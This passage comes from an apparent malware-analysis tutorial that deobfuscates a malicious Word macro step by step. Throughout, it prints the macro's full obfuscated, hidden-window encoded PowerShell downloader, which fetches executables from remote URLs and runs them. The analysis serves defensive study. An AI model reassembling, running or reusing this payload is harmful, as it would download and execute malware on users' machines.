<pre><code>34. <strong>Jqzbdljbr</strong> = <strong>I</strong> + <strong>ChrW(wdKeyP)</strong></code></pre>
<p>We must find <code>I</code> and <code>ChrW(wdKeyP)</code> .</p>
<p><code>I</code> is not initialized.</p>
<pre><code>35. <strong>I</strong> = ""</code></pre>
<p>Let's find <code>ChrW(wdKeyP)</code> <strong>.</strong> According to <a href="https://docs.microsoft.com/en-us/office/vba/api/word.wdkey" target="_blank" rel="noopener"> wdKey enumeration </a> :</p>
<pre><code>36. <strong>wdKeyP</strong> = 80</code></pre>
<p>According to ASCII code, 80 specifies the <code>P</code> character. When we put 80 in place of <code>wdKeyP</code> in <code>ChrW(wdKeyP)</code> , we get:</p>
<pre><code>37. <strong>ChrW(80)</strong> = "P"</code></pre>
<p>So, <code>ChrW(wdKeyS)</code> is equal to the <code>P</code> character, but adversaries used <code>wdKeyP</code> and <code>ChrW</code> functions together instead of a simple <code>P</code> for obfuscation.</p>
<p>Let's put <mark>35.</mark> and <mark>37.</mark> in <mark>34.</mark></p>
<pre><code>38. <strong>Jqzbdljbr</strong> = "" + "P"</code></pre>
<p>Concatenate strings:</p>
<pre><code>39. <strong>Jqzbdljbr</strong> = "P"</code></pre>
<p>Now, let's find <code>Dtcqcidgf.Iqjssfeeu</code> . It does not exist in the macro code, it is a form variable:</p>
<pre><code>VBA FORM Variable "Iqjssfeeu" IN '01856218536426646.doc' - OLE stream: 'Macros/Dtcqcidgf'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
'o=mmuusns=w=mmuusns=e=mmuusns=r=mmuusns=s=mmuusns=h=mmuusns=el=mmuusns=l=mmuusns= =mmuusns=-=mmuusns=w=mmuusns= =mmuusns=h=mmuusns=i'</code></pre>
<p>Therefore:</p>
<pre><code>40. <strong>Dtcqcidgf.Iqjssfeeu</strong>="o=mmuusns=w=mmuusns=e=mmuusns=r=mmuusns=s=mmuusns=h=mmuusns=el=mmuusns=l=mmuusns= =mmuusns=-=mmuusns=w=mmuusns= =mmuusns=h=mmuusns=i"</code></pre>
<p><code>Dtcqcidgf.Zxioomrqvjz</code> is also a form variable:</p>
<pre><code>VBA FORM Variable "b'Zxioomrqvjz'" IN '01856218536426646.doc' - OLE stream: 'Macros/Dtcqcidgf'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
'd=mmuusns=d=mmuusns=e=mmuusns=n=mmuusns= =mmuusns=-=mmuusns=e=mmuusns=n '</code></pre>
<p>Then:</p>
<pre><code>41. <strong>Dtcqcidgf.Zxioomrqvjz</strong> ="d=mmuusns=d=mmuusns=e=mmuusns=n=mmuusns= =mmuusns=-=mmuusns=e=mmuusns=n "</code></pre>
<p>Now, let's find <code>CVar(Trim(Dtcqcidgf.Xrqtcysa.GroupName)</code> . First, we must find <code>Dtcqcidgf.Xrqtcysa.Groupname</code> . <code>Dtcqcidgf.Xrqtcysa</code> is also a form variable:</p>
<pre><code>VBA FORM Variable "b'Xrqtcysa'" IN '01856218536426646.doc' - OLE stream: 'Macros/Dtcqcidgf'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
'0'</code></pre>
<p><code>Dtcqcidgf.Xrqtcysa.GroupName</code> means that <code>GroupName</code> property of <code>Dtcqcidgf.Xrqtcysa</code> is a form variable.</p>
<blockquote>
<div style="font-size: 1.5em;"><span>💡</span></div>
<div style="width: 100%;"><a href="https://docs.microsoft.com/en-us/office/vba/language/reference/user-interface-help/groupname-property" target="_blank" rel="noopener"> GroupName </a> is a property of form controls, such as OptionButton.</div>
</blockquote>
<p><code>GroupName</code> property of <code>Dtcqcidgf.Xrqtcysa</code> includes a long string:</p>
<pre><code>42. CVar(Trim(<strong>Dtcqcidgf.Xrqtcysa</strong>.<strong>GroupName</strong>)) = CVar(Trim("                                                                                                                                                                   ............ stripped ............                                                 JABBAH=mmuusns=oAeQB0=mmuusns=AGoAaA=mmuusns=B6AGcA=mmuusns=YQB1AG=mmuusns=0AaQBn=mmuusns=AD0AJw=mmuusns=BOAHYA=mmuusns=eABkAH=mmuusns=gAZwBj=mmuusns=AGMAYg=mmuusns=BuAGcA=mmuusns=JwA7AC=mmuusns=QATgBu=mmuusns=AHkAag=mmuusns=B0AGgA=mmuusns=YwByAH=mmuusns=oAagBv=mmuusns=AHkAdg=mmuusns=AgAD0A=mmuusns=IAAnAD=mmuusns=kAMwA3=mmuusns=ACcAOw=mmuusns=AkAEkA=mmuusns=aQBxAH=mmuusns=MAZgBw=mmuusns=AHMAbQ=mmuusns=A9ACcA=mmuusns=UgBvAG=mmuusns=cAeABw=mmuusns=AGcAeQ=mmuusns=B2AGUA=mmuusns=JwA7AC=mmuusns=QARQBr=mmuusns=AHgAaA=mmuusns=BsAG8A=mmuusns=YgBxAH=mmuusns=IAbABo=mmuusns=AD0AJA=mmuusns=BlAG4A=mmuusns=dgA6AH=mmuusns=UAcwBl=mmuusns=AHIAcA=mmuusns=ByAG8A=mmuusns=ZgBpAG=mmuusns=wAZQAr=mmuusns=ACcAXA=mmuusns=AnACsA=mmuusns=JABOAG=mmuusns=4AeQBq=mmuusns=AHQAaA=mmuusns=BjAHIA=mmuusns=egBqAG=mmuusns=8AeQB2=mmuusns=ACsAJw=mmuusns=AuAGUA=mmuusns=eABlAC=mmuusns=cAOwAk=mmuu
............ stripped ............"))</code></pre>
<details>
<summary>Expand the full code of <code>Dtcqcidgf.Xrqtcysa.GroupName</code></summary>
<pre><code>42. CVar(Trim(<strong>Dtcqcidgf.Xrqtcysa</strong>.<strong>GroupName</strong>)) = CVar(Trim("                                                      





                                                                                      JABBAH=mmuusns=oAeQB0=mmuusns=AGoAaA=mmuusns=B6AGcA=mmuusns=YQB1AG=mmuusns=0AaQBn=mmuusns=AD0AJw=mmuusns=BOAHYA=mmuusns=eABkAH=mmuusns=gAZwBj=mmuusns=AGMAYg=mmuusns=BuAGcA=mmuusns=JwA7AC=mmuusns=QATgBu=mmuusns=AHkAag=mmuusns=B0AGgA=mmuusns=YwByAH=mmuusns=oAagBv=mmuusns=AHkAdg=mmuusns=AgAD0A=mmuusns=IAAnAD=mmuusns=kAMwA3=mmuusns=ACcAOw=mmuusns=AkAEkA=mmuusns=aQBxAH=mmuusns=MAZgBw=mmuusns=AHMAbQ=mmuusns=A9ACcA=mmuusns=UgBvAG=mmuusns=cAeABw=mmuusns=AGcAeQ=mmuusns=B2AGUA=mmuusns=JwA7AC=mmuusns=QARQBr=mmuusns=AHgAaA=mmuusns=BsAG8A=mmuusns=YgBxAH=mmuusns=IAbABo=mmuusns=AD0AJA=mmuusns=BlAG4A=mmuusns=dgA6AH=mmuusns=UAcwBl=mmuusns=AHIAcA=mmuusns=ByAG8A=mmuusns=ZgBpAG=mmuusns=wAZQAr=mmuusns=ACcAXA=mmuusns=AnACsA=mmuusns=JABOAG=mmuusns=4AeQBq=mmuusns=AHQAaA=mmuusns=BjAHIA=mmuusns=egBqAG=mmuusns=8AeQB2=mmuusns=ACsAJw=mmuusns=AuAGUA=mmuusns=eABlAC=mmuusns=cAOwAk=mmuusns=AFMAYg=mmuusns=ByAHkA=mmuusns=cAB5AH=mmuusns=cAeABn=mmuusns=AGMAaQ=mmuusns=B0AGYA=mmuusns=PQAnAF=mmuusns=cAcABh=mmuusns=AHcAeQ=mmuusns=BiAGkA=mmuusns=cQBtAG=mmuusns=oAJwA7=mmuusns=ACQASA=mmuusns=BpAHIA=mmuusns=bQB5AG=mmuusns=gAcQBh=mmuusns=AGwAdA=mmuusns=BvAHMA=mmuusns=PQAmAC=mmuusns=gAJwBu=mmuusns=AGUAdw=mmuusns=AtAG8A=mmuusns=JwArAC=mmuusns=cAYgBq=mmuusns=ACcAKw=mmuusns=AnAGUA=mmuusns=YwB0AC=mmuusns=cAKQAg=mmuusns=AE4AZQ=mmuusns=BUAC4A=mmuusns=VwBlAE=mmuusns=IAQwBM=mmuusns=AGkARQ=mmuusns=BuAFQA=mmuusns=OwAkAF=mmuusns=IAeABi=mmuusns=AHkAdw=mmuusns=BpAGMA=mmuusns=aQA9AC=mmuusns=cAaAB0=mmuusns=AHQAcA=mmuusns=A6AC8A=mmuusns=LwBhAG=mmuusns=gAYwAu=mmuusns=AG0Acg=mmuusns=BiAGQA=mmuusns=ZQB2AC=mmuusns=4AYwBv=mmuusns=AG0ALw=mmuusns=B3AHAA=mmuusns=LQBhAG=mmuusns=QAbQBp=mmuusns=AG4ALw=mmuusns=BxAHAA=mmuusns=MAAvAC=mmuusns=oAaAB0=mmuusns=AHQAcA=mmuusns=A6AC8A=mmuusns=LwBlAC=mmuusns=0AdAB3=mmuusns=AG8Adw=mmuusns=AuAGIA=mmuusns=ZQAvAH=mmuusns=YAZQBy=mmuusns=AGQAZQ=mmuusns=AvAGkA=mmuusns=bgA2AG=mmuusns=sALwAq=mmuusns=AGgAdA=mmuusns=B0AHAA=mmuusns=cwA6AC=mmuusns=8ALwBt=mmuusns=AGEAZw=mmuusns=BuAGkA=mmuusns=ZgBpAG=mmuusns=MAZQBu=mmuusns=AHQAcA=mmuusns=BhAGsA=mmuusns=aQBzAH=mmuusns=QAYQBu=mmuusns=AC4AYw=mmuusns=BvAG0A=mmuusns=LwB3AH=mmuusns=AALQBp=mmuusns=AG4AYw=mmuusns=BsAHUA=mmuusns=ZABlAH=mmuusns=MALwBo=mmuusns=AGEANQ=mmuusns=BqADAA=mmuusns=YgAxAC=mmuusns=8AKgBo=mmuusns=AHQAdA=mmuusns=BwAHMA=mmuusns=OgAvAC=mmuusns=8AdwB3=mmuusns=AHcALg=mmuusns=BxAHcA=mmuusns=cQBvAG=mmuusns=8ALgBj=mmuusns=AG8AbQ=mmuusns=AvAGgA=mmuusns=bwBtAG=mmuusns=wAZAB3=mmuusns=AC8AMw=mmuusns=BwAGkA=mmuusns=eQB5AD=mmuusns=QALwAq=mmuusns=AGgAdA=mmuusns=B0AHAA=mmuusns=OgAvAC=mmuusns=8AcwBp=mmuusns=AHcAYQ=mmuusns=BrAHUA=mmuusns=cABvAH=mmuusns=MAbwAu=mmuusns=AGMAbw=mmuusns=BtAC8A=mmuusns=cwBpAH=mmuusns=cAYQBr=mmuusns=AHUAMg=mmuusns=AvAFgA=mmuusns=NQB6AE=mmuusns=IAMABl=mmuusns=AHkALw=mmuusns=AnAC4A=mmuusns=IgBzAH=mmuusns=AATABg=mmuusns=AGkAVA=mmuusns=AiACgA=mmuusns=WwBjAG=mmuusns=gAYQBy=mmuusns=AF0ANA=mmuusns=AyACkA=mmuusns=OwAkAE=mmuusns=4AdQBv=mmuusns=AGwAdA=mmuusns=B3AGYA=mmuusns=cQBoAD=mmuusns=0AJwBR=mmuusns=AHIAdg=mmuusns=BvAGgA=mmuusns=ZABpAH=mmuusns=UAYgBm=mmuusns=AGUAaw=mmuusns=AnADsA=mmuusns=ZgBvAH=mmuusns=IAZQBh=mmuusns=AGMAaA=mmuusns=AoACQA=mmuusns=TgBkAG=mmuusns=wAdQBh=mmuusns=AGwAdQ=mmuusns=B2ACAA=mmuusns=aQBuAC=mmuusns=AAJABS=mmuusns=AHgAYg=mmuusns=B5AHcA=mmuusns=aQBjAG=mmuusns=kAKQB7=mmuusns=AHQAcg=mmuusns=B5AHsA=mmuusns=JABIAG=mmuusns=kAcgBt=mmuusns=AHkAaA=mmuusns=BxAGEA=mmuusns=bAB0AG=mmuusns=8AcwAu=mmuusns=ACIARA=mmuusns=BvAHcA=mmuusns=YABOAG=mmuusns=wAbwBh=mmuusns=AGQAZg=mmuusns=BpAGAA=mmuusns=TABFAC=mmuusns=IAKAAk=mmuusns=AE4AZA=mmuusns=BsAHUA=mmuusns=YQBsAH=mmuusns=UAdgAs=mmuusns=ACAAJA=mmuusns=BFAGsA=mmuusns=eABoAG=mmuusns=wAbwBi=mmuusns=AHEAcg=mmuusns=BsAGgA=mmuusns=KQA7AC=mmuusns=QASABr=mmuusns=AHUAaw=mmuusns=BrAGYA=mmuusns=bwBwAH=mmuusns=QAagBk=mmuusns=AHIAPQ=mmuusns=AnAFgA=mmuusns=YQBiAG=mmuusns=QAeAB2=mmuusns=AGsAZg=mmuusns=BjAG0A=mmuusns=YQAnAD=mmuusns=sASQBm=mmuusns=ACAAKA=mmuusns=AoACYA=mmuusns=KAAnAE=mmuusns=cAZQB0=mmuusns=AC0ASQ=mmuusns=AnACsA=mmuusns=JwB0AG=mmuusns=UAbQAn=mmuusns=ACkAIA=mmuusns=AkAEUA=mmuusns=awB4AG=mmuusns=gAbABv=mmuusns=AGIAcQ=mmuusns=ByAGwA=mmuusns=aAApAC=mmuusns=4AIgBM=mmuusns=AGAAZQ=mmuusns=BuAGcA=mmuusns=YABUAE=mmuusns=gAIgAg=mmuusns=AC0AZw=mmuusns=BlACAA=mmuusns=MgA5AD=mmuusns=kAMwA2=mmuusns=ACkAIA=mmuusns=B7AFsA=mmuusns=RABpAG=mmuusns=EAZwBu=mmuusns=AG8Acw=mmuusns=B0AGkA=mmuusns=YwBzAC=mmuusns=4AUABy=mmuusns=AG8AYw=mmuusns=BlAHMA=mmuusns=cwBdAD=mmuusns=oAOgAi=mmuusns=AHMAYA=mmuusns=BUAEEA=mmuusns=UgB0AC=mmuusns=IAKAAk=mmuusns=AEUAaw=mmuusns=B4AGgA=mmuusns=bABvAG=mmuusns=IAcQBy=mmuusns=AGwAaA=mmuusns=ApADsA=mmuusns=JABZAH=mmuusns=oAagBq=mmuusns=AGYAcA=mmuusns=BsAG0A=mmuusns=awBnAH=mmuusns=gAPQAn=mmuusns=AEIAeA=mmuusns=BsAGsA=mmuusns=cQBtAH=mmuusns=QAeABh=mmuusns=ACcAOw=mmuusns=BiAHIA=mmuusns=ZQBhAG=mmuusns=sAOwAk=mmuusns=AE0Abw=mmuusns=BsAGMA=mmuusns=aABpAG=mmuusns=oAeAA9=mmuusns=ACcAUQ=mmuusns=B1AGEA=mmuusns=dABsAG=mmuusns=IAZABs=mmuusns=AHEAdg=mmuusns=BmAGQA=mmuusns=cAAnAH=mmuusns=0AfQBj=mmuusns=AGEAdA=mmuusns=BjAGgA=mmuusns=ewB9AH=mmuusns=0AJABS=mmuusns=AGMAaw=mmuusns=BhAGoA=mmuusns=cgB4AH=mmuusns=YAaQA9=mmuusns=ACcARQ=mmuusns=BqAGUA=mmuusns=YwB3AG=mmuusns=EAcgBn=mmuusns=AGsAYw=mmuusns=BsACcA"))</code></pre>
<p><!--more--></p>
</details>
<p><code>Dtcqcidgf.Xrqtcysa.GroupName</code> starts with dozens of space characters. Adversaries added these space characters for obfuscation and used <code>Trim</code> function to get rid of them.</p>
<blockquote>
<div style="font-size: 1.5em;"><span>💡</span></div>
<div style="width: 100%;">The <a href="https://docs.microsoft.com/en-us/office/vba/language/reference/user-interface-help/ltrim-rtrim-and-trim-functions" target="_blank" rel="noopener"> Trim </a> function strips leading and trailing spaces from a string variable.</div>
</blockquote>
<pre><code>43. CVar(Trim(<strong>Dtcqcidgf.Xrqtcysa</strong>.<strong>GroupName</strong>)) = CVar("JABBAH=mmuusns=oAeQB0=mmuusns=AGoAaA=mmuusns=B6AGcA=mmuusns=YQB1AG=mmuusns=0AaQBn=mmuusns=AD0AJw=mmuusns=BOAHYA=mmuusns=eABkAH=mmuusns=gAZwBj=mmuusns=AGMAYg=mmuusns=BuAGcA=mmuusns=JwA7AC=mmuusns=QATgBu=mmuusns=AHkAag=mmuusns=B0AGgA=mmuusns=YwByAH=mmuusns=oAagBv=mmuusns=AHkAdg=mmuusns=AgAD0A=mmuusns=IAAnAD=mmuusns=kAMwA3=mmuusns=ACcAOw=mmuusns=AkAEkA=mmuusns=aQBxAH=mmuusns=MAZgBw=mmuusns=AHMAbQ=mmuusns=A9ACcA=mmuusns=UgBvAG=mmuusns=cAeABw=mmuusns=AGcAeQ=mmuusns=B2AGUA=mmuusns=JwA7AC=mmuusns=QARQBr=mmuusns=AHgAaA=mmuusns=BsAG8A=mmuusns=YgBxAH=mmuusns=IAbABo=mmuusns=AD0AJA=mmuusns=BlAG4A=mmuusns=dgA6AH=mmuusns=UAcwBl=mmuusns=AHIAcA=mmuusns=ByAG8A=mmuusns=ZgBpAG=mmuusns=wAZQAr=mmuusns=ACcAXA=mmuusns=AnACsA=mmuusns=JABOAG=mmuusns=4AeQBq=mmuusns=AHQAaA=mmuusns=BjAHIA=mmuusns=egBqAG=mmuusns=8AeQB2=mmuusns=ACsAJw=mmuusns=AuAGUA=mmuusns=eABlAC=mmuusns=cAOwAk=mmuu............ stripped ............")</code></pre>
<p>In fact, CVar function is useless in this code. As you can guess, adversaries used this function for obfuscation.</p>
<blockquote>
<div style="font-size: 1.5em;"><span>💡</span></div>
<div style="width: 100%;"><a href="https://docs.microsoft.com/en-us/office/vba/language/concepts/getting-started/type-conversion-functions" target="_blank" rel="noopener"> CVar </a> is a type conversion function. It converts any string expression or numeric expression to a variant.</div>
</blockquote>
<pre><code>44. CVar(Trim(<strong>Dtcqcidgf.Xrqtcysa</strong>.<strong>GroupName</strong>)) = "JABBAH=mmuusns=oAeQB0=mmuusns=AGoAaA=mmuusns=B6AGcA=mmuusns=YQB1AG=mmuusns=0AaQBn=mmuusns=AD0AJw=mmuusns=BOAHYA=mmuusns=eABkAH=mmuusns=gAZwBj=mmuusns=AGMAYg=mmuusns=BuAGcA=mmuusns=JwA7AC=mmuusns=QATgBu=mmuusns=AHkAag=mmuusns=B0AGgA=mmuusns=YwByAH=mmuusns=oAagBv=mmuusns=AHkAdg=mmuusns=AgAD0A=mmuusns=IAAnAD=mmuusns=kAMwA3=mmuusns=ACcAOw=mmuusns=AkAEkA=mmuusns=aQBxAH=mmuusns=MAZgBw=mmuusns=AHMAbQ=mmuusns=A9ACcA=mmuusns=UgBvAG=mmuusns=cAeABw=mmuusns=AGcAeQ=mmuusns=B2AGUA=mmuusns=JwA7AC=mmuusns=QARQBr=mmuusns=AHgAaA=mmuusns=BsAG8A=mmuusns=YgBxAH=mmuusns=IAbABo=mmuusns=AD0AJA=mmuusns=BlAG4A=mmuusns=dgA6AH=mmuusns=UAcwBl=mmuusns=AHIAcA=mmuusns=ByAG8A=mmuusns=ZgBpAG=mmuusns=wAZQAr=mmuusns=ACcAXA=mmuusns=AnACsA=mmuusns=JABOAG=mmuusns=4AeQBq=mmuusns=AHQAaA=mmuusns=BjAHIA=mmuusns=egBqAG=mmuusns=8AeQB2=mmuusns=ACsAJw=mmuusns=AuAGUA=mmuusns=eABlAC=mmuusns=cAOwAk=mmuu............ stripped ............"</code></pre>
<p>It's time to put <mark>39.</mark> , <mark>40.</mark> , <mark>41.</mark> and <mark>44.</mark> in <mark>33.</mark> :</p>
<pre><code>45. <strong>Ysjchbkkg</strong> = Join(Split("P" + "o=mmuusns=w=mmuusns=e=mmuusns=r=mmuusns=s=mmuusns=h=mmuusns=el=mmuusns=l=mmuusns= =mmuusns=-=mmuusns=w=mmuusns= =mmuusns=h=mmuusns=i" + "d=mmuusns=d=mmuusns=e=mmuusns=n=mmuusns= =mmuusns=-=mmuusns=e=mmuusns=n " + "JABBAH=mmuusns=oAeQB0=mmuusns=AGoAaA=mmuusns=B6AGcA=mmuusns=YQB1AG=mmuusns=0AaQBn=mmuusns=AD0AJw=mmuusns=BOAHYA=mmuusns=eABkAH=mmuusns=gAZwBj=mmuusns=AGMAYg=mmuusn
................................ stripped ........................................
s=BqAGUA=mmuusns=YwB3AG=mmuusns=EAcgBn=mmuusns=AGsAYw=mmuusns=BsACcA"), "=mmuusns="), "")</code></pre>
<details>
<summary>Expand the full code of <code>Ysjchbkkg</code></summary>
<pre><code>45. <strong>Ysjchbkkg</strong> = Join(Split("P" + "o=mmuusns=w=mmuusns=e=mmuusns=r=mmuusns=s=mmuusns=h=mmuusns=el=mmuusns=l=mmuusns= =mmuusns=-=mmuusns=w=mmuusns= =mmuusns=h=mmuusns=i" + "d=mmuusns=d=mmuusns=e=mmuusns=n=mmuusns= =mmuusns=-=mmuusns=e=mmuusns=n " + "JABBAH=mmuusns=oAeQB0=mmuusns=AGoAaA=mmuusns=B6AGcA=mmuusns=YQB1AG=mmuusns=0AaQBn=mmuusns=AD0AJw=mmuusns=BOAHYA=mmuusns=eABkAH=mmuusns=gAZwBj=mmuusns=AGMAYg=mmuusns=BuAGcA=mmuusns=JwA7AC=mmuusns=QATgBu=mmuusns=AHkAag=mmuusns=B0AGgA=mmuusns=YwByAH=mmuusns=oAagBv=mmuusns=AHkAdg=mmuusns=AgAD0A=mmuusns=IAAnAD=mmuusns=kAMwA3=mmuusns=ACcAOw=mmuusns=AkAEkA=mmuusns=aQBxAH=mmuusns=MAZgBw=mmuusns=AHMAbQ=mmuusns=A9ACcA=mmuusns=UgBvAG=mmuusns=cAeABw=mmuusns=AGcAeQ=mmuusns=B2AGUA=mmuusns=JwA7AC=mmuusns=QARQBr=mmuusns=AHgAaA=mmuusns=BsAG8A=mmuusns=YgBxAH=mmuusns=IAbABo=mmuusns=AD0AJA=mmuusns=BlAG4A=mmuusns=dgA6AH=mmuusns=UAcwBl=mmuusns=AHIAcA=mmuusns=ByAG8A=mmuusns=ZgBpAG=mmuusns=wAZQAr=mmuusns=ACcAXA=mmuusns=AnACsA=mmuusns=JABOAG=mmuusns=4AeQBq=mmuusns=AHQAaA=mmuusns=BjAHIA=mmuusns=egBqAG=mmuusns=8AeQB2=mmuusns=ACsAJw=mmuusns=AuAGUA=mmuusns=eABlAC=mmuusns=cAOwAk=mmuusns=AFMAYg=mmuusns=ByAHkA=mmuusns=cAB5AH=mmuusns=cAeABn=mmuusns=AGMAaQ=mmuusns=B0AGYA=mmuusns=PQAnAF=mmuusns=cAcABh=mmuusns=AHcAeQ=mmuusns=BiAGkA=mmuusns=cQBtAG=mmuusns=oAJwA7=mmuusns=ACQASA=mmuusns=BpAHIA=mmuusns=bQB5AG=mmuusns=gAcQBh=mmuusns=AGwAdA=mmuusns=BvAHMA=mmuusns=PQAmAC=mmuusns=gAJwBu=mmuusns=AGUAdw=mmuusns=AtAG8A=mmuusns=JwArAC=mmuusns=cAYgBq=mmuusns=ACcAKw=mmuusns=AnAGUA=mmuusns=YwB0AC=mmuusns=cAKQAg=mmuusns=AE4AZQ=mmuusns=BUAC4A=mmuusns=VwBlAE=mmuusns=IAQwBM=mmuusns=AGkARQ=mmuusns=BuAFQA=mmuusns=OwAkAF=mmuusns=IAeABi=mmuusns=AHkAdw=mmuusns=BpAGMA=mmuusns=aQA9AC=mmuusns=cAaAB0=mmuusns=AHQAcA=mmuusns=A6AC8A=mmuusns=LwBhAG=mmuusns=gAYwAu=mmuusns=AG0Acg=mmuusns=BiAGQA=mmuusns=ZQB2AC=mmuusns=4AYwBv=mmuusns=AG0ALw=mmuusns=B3AHAA=mmuusns=LQBhAG=mmuusns=QAbQBp=mmuusns=AG4ALw=mmuusns=BxAHAA=mmuusns=MAAvAC=mmuusns=oAaAB0=mmuusns=AHQAcA=mmuusns=A6AC8A=mmuusns=LwBlAC=mmuusns=0AdAB3=mmuusns=AG8Adw=mmuusns=AuAGIA=mmuusns=ZQAvAH=mmuusns=YAZQBy=mmuusns=AGQAZQ=mmuusns=AvAGkA=mmuusns=bgA2AG=mmuusns=sALwAq=mmuusns=AGgAdA=mmuusns=B0AHAA=mmuusns=cwA6AC=mmuusns=8ALwBt=mmuusns=AGEAZw=mmuusns=BuAGkA=mmuusns=ZgBpAG=mmuusns=MAZQBu=mmuusns=AHQAcA=mmuusns=BhAGsA=mmuusns=aQBzAH=mmuusns=QAYQBu=mmuusns=AC4AYw=mmuusns=BvAG0A=mmuusns=LwB3AH=mmuusns=AALQBp=mmuusns=AG4AYw=mmuusns=BsAHUA=mmuusns=ZABlAH=mmuusns=MALwBo=mmuusns=AGEANQ=mmuusns=BqADAA=mmuusns=YgAxAC=mmuusns=8AKgBo=mmuusns=AHQAdA=mmuusns=BwAHMA=mmuusns=OgAvAC=mmuusns=8AdwB3=mmuusns=AHcALg=mmuusns=BxAHcA=mmuusns=cQBvAG=mmuusns=8ALgBj=mmuusns=AG8AbQ=mmuusns=AvAGgA=mmuusns=bwBtAG=mmuusns=wAZAB3=mmuusns=AC8AMw=mmuusns=BwAGkA=mmuusns=eQB5AD=mmuusns=QALwAq=mmuusns=AGgAdA=mmuusns=B0AHAA=mmuusns=OgAvAC=mmuusns=8AcwBp=mmuusns=AHcAYQ=mmuusns=BrAHUA=mmuusns=cABvAH=mmuusns=MAbwAu=mmuusns=AGMAbw=mmuusns=BtAC8A=mmuusns=cwBpAH=mmuusns=cAYQBr=mmuusns=AHUAMg=mmuusns=AvAFgA=mmuusns=NQB6AE=mmuusns=IAMABl=mmuusns=AHkALw=mmuusns=AnAC4A=mmuusns=IgBzAH=mmuusns=AATABg=mmuusns=AGkAVA=mmuusns=AiACgA=mmuusns=WwBjAG=mmuusns=gAYQBy=mmuusns=AF0ANA=mmuusns=AyACkA=mmuusns=OwAkAE=mmuusns=4AdQBv=mmuusns=AGwAdA=mmuusns=B3AGYA=mmuusns=cQBoAD=mmuusns=0AJwBR=mmuusns=AHIAdg=mmuusns=BvAGgA=mmuusns=ZABpAH=mmuusns=UAYgBm=mmuusns=AGUAaw=mmuusns=AnADsA=mmuusns=ZgBvAH=mmuusns=IAZQBh=mmuusns=AGMAaA=mmuusns=AoACQA=mmuusns=TgBkAG=mmuusns=wAdQBh=mmuusns=AGwAdQ=mmuusns=B2ACAA=mmuusns=aQBuAC=mmuusns=AAJABS=mmuusns=AHgAYg=mmuusns=B5AHcA=mmuusns=aQBjAG=mmuusns=kAKQB7=mmuusns=AHQAcg=mmuusns=B5AHsA=mmuusns=JABIAG=mmuusns=kAcgBt=mmuusns=AHkAaA=mmuusns=BxAGEA=mmuusns=bAB0AG=mmuusns=8AcwAu=mmuusns=ACIARA=mmuusns=BvAHcA=mmuusns=YABOAG=mmuusns=wAbwBh=mmuusns=AGQAZg=mmuusns=BpAGAA=mmuusns=TABFAC=mmuusns=IAKAAk=mmuusns=AE4AZA=mmuusns=BsAHUA=mmuusns=YQBsAH=mmuusns=UAdgAs=mmuusns=ACAAJA=mmuusns=BFAGsA=mmuusns=eABoAG=mmuusns=wAbwBi=mmuusns=AHEAcg=mmuusns=BsAGgA=mmuusns=KQA7AC=mmuusns=QASABr=mmuusns=AHUAaw=mmuusns=BrAGYA=mmuusns=bwBwAH=mmuusns=QAagBk=mmuusns=AHIAPQ=mmuusns=AnAFgA=mmuusns=YQBiAG=mmuusns=QAeAB2=mmuusns=AGsAZg=mmuusns=BjAG0A=mmuusns=YQAnAD=mmuusns=sASQBm=mmuusns=ACAAKA=mmuusns=AoACYA=mmuusns=KAAnAE=mmuusns=cAZQB0=mmuusns=AC0ASQ=mmuusns=AnACsA=mmuusns=JwB0AG=mmuusns=UAbQAn=mmuusns=ACkAIA=mmuusns=AkAEUA=mmuusns=awB4AG=mmuusns=gAbABv=mmuusns=AGIAcQ=mmuusns=ByAGwA=mmuusns=aAApAC=mmuusns=4AIgBM=mmuusns=AGAAZQ=mmuusns=BuAGcA=mmuusns=YABUAE=mmuusns=gAIgAg=mmuusns=AC0AZw=mmuusns=BlACAA=mmuusns=MgA5AD=mmuusns=kAMwA2=mmuusns=ACkAIA=mmuusns=B7AFsA=mmuusns=RABpAG=mmuusns=EAZwBu=mmuusns=AG8Acw=mmuusns=B0AGkA=mmuusns=YwBzAC=mmuusns=4AUABy=mmuusns=AG8AYw=mmuusns=BlAHMA=mmuusns=cwBdAD=mmuusns=oAOgAi=mmuusns=AHMAYA=mmuusns=BUAEEA=mmuusns=UgB0AC=mmuusns=IAKAAk=mmuusns=AEUAaw=mmuusns=B4AGgA=mmuusns=bABvAG=mmuusns=IAcQBy=mmuusns=AGwAaA=mmuusns=ApADsA=mmuusns=JABZAH=mmuusns=oAagBq=mmuusns=AGYAcA=mmuusns=BsAG0A=mmuusns=awBnAH=mmuusns=gAPQAn=mmuusns=AEIAeA=mmuusns=BsAGsA=mmuusns=cQBtAH=mmuusns=QAeABh=mmuusns=ACcAOw=mmuusns=BiAHIA=mmuusns=ZQBhAG=mmuusns=sAOwAk=mmuusns=AE0Abw=mmuusns=BsAGMA=mmuusns=aABpAG=mmuusns=oAeAA9=mmuusns=ACcAUQ=mmuusns=B1AGEA=mmuusns=dABsAG=mmuusns=IAZABs=mmuusns=AHEAdg=mmuusns=BmAGQA=mmuusns=cAAnAH=mmuusns=0AfQBj=mmuusns=AGEAdA=mmuusns=BjAGgA=mmuusns=ewB9AH=mmuusns=0AJABS=mmuusns=AGMAaw=mmuusns=BhAGoA=mmuusns=cgB4AH=mmuusns=YAaQA9=mmuusns=ACcARQ=mmuusns=BqAGUA=mmuusns=YwB3AG=mmuusns=EAcgBn=mmuusns=AGsAYw=mmuusns=BsACcA"), "=mmuusns="), "")</code></pre>
<p><!--more--></p>
</details>
<p>Get rid of <code>+</code> characters:</p>
<pre><code>46. <strong>Ysjchbkkg</strong> = Join(Split("Po=mmuusns=w=mmuusns=e=mmuusns=r=mmuusns=s=mmuusns=h=mmuusns=el=mmuusns=l=mmuusns= =mmuusns=-=mmuusns=w=mmuusns= =mmuusns=h=mmuusns=id=mmuusns=d=mmuusns=e=mmuusns=n=mmuusns= =mmuusns=-=mmuusns=e=mmuusns=n JABBAH=mmuusns=oAeQB0=mmuusns=AGoAaA=mmuusns=B6AGcA=mmuusns=YQB1AG=mmuusns=0AaQBn=mmuusns=AD0AJw=mmuusns=BOAHYA=mmuusns=eABkAH=mmuusns=gAZwBj=mmuusns=AGMAYg=mmuusn
................................ stripped ........................................
s=BqAGUA=mmuusns=YwB3AG=mmuusns=EAcgBn=mmuusns=AGsAYw=mmuusns=BsACcA"), "=mmuusns="), "")</code></pre>
<p>Split the text with <code>=mmuusns=</code> delimiter:</p>
